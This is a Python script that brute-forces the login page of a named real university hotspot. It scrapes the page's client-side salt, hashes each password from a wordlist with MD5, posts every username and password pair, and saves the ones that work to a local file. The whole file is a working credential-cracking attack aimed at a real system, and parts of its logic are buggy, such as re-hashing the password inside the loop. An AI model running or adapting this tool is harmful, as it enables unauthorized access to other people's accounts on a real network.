import argparse
import hashlib
import os
from bs4 import BeautifulSoup as bs
import requests
from time import ctime, time


address = "http://hotspot.abu.edu.ng/login"

def main():
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument("-u", "--usernames", help="specify a file containing list of usernames", required=True)
        parser.add_argument("-p", "--passwords", help="specify a file containing list of passwords", required=True)
        args = parser.parse_args()
        opener(args.usernames, args.passwords)
    except KeyboardInterrupt as e:
        print("Cracking interrupted....Ending...")
        exit()

#opener: u gussed it as the name implies open a list of usernames and passwords
#read them and save them to memory
def opener(user_list, pass_list):
    try:
        with open(os.getcwd()+"/"+user_list, "r") as f:
            usernames = f.readlines() # contains the list of usernames
        with open(os.getcwd()+"/"+pass_list, "r") as f:
            passwords = f.readlines() #contains the list of passwords
        print("Loaded "+str(len(usernames))+" usernames with "+str(len(passwords))+" passwords...")
        cracker(usernames, passwords)
    except IOError as e:
        print(e)
        exit()


#this function try all the combination of usernames and password in the
#supplied dictionaries(of usernames and passwords)
def cracker(usernames, passwords):
    with open(os.getcwd()+"/cracked_cred.dmd", "a") as f:
        start_time = time()
        print("Started at %s \nCracking..."%ctime(start_time))
        for psswds in passwords:
            psswd = psswds.strip("\n")
            for users in usernames:
                user = users.strip("\n")
                psswd = encrypt(psswd) #placed here in case of more than 1 username
                print("trying user: "+user+" with hash "+psswd)
                cracked = checker(user, psswd)
                if cracked:
                    f.write(user+"::"+psswds+"\n")
                    print("found password for "+user+" ==> "+psswds)
                    usernames.remove(users)
    print("Exhausted the list of passwords \n total time taken: %s"%time()-start_time)



#this function checks if the username and password matches by passing
#them to the site
def checker(user, psswd):
    try:
        payloads = {"username":user, "password":psswd, "dst":"", "popup":"true"}
        with requests.Session() as s:
            page = s.post(address, data=payloads)
        soup = bs(page.content, "html.parser")
        page = soup.prettify("utf-8")
        if "You are logged in" in page:
            with requests.Session() as s:
                s.get("http://hotspot.abu.edu.ng/logout")
            return True
        else:
            return False
    except Exception:
        pass

#this function replicates the security implementation used in the site
#which is happening on client side
#i.e appending a salt to begining and end of password then encrypting
#with md5
def encrypt(psswd):
    try:
        with requests.Session() as s:
            page = s.get(address) #get the login page
        soup = bs(page.content, "html.parser") #parsing the page
        clean_page = soup.prettify("utf-8")
        clean_page_soup = bs(clean_page, "html.parser")
        script = str(clean_page_soup.find("script").find_next().string.strip())
        first = chr(int(script[144:147], 8))
        second = script[185:248].split("\\")
        chars = [] #this will contains a list of character that will be converted to 4rm ints in the next lines
        for i in second:    #for each item in the list second
            chars.append(chr(int(i, 8)))  #append a chr value which is converted from int
        second = "".join(chars)
        return hashlib.md5(first+psswd+second).hexdigest()
    except Exception:
            pass



if __name__=="__main__":
    main()
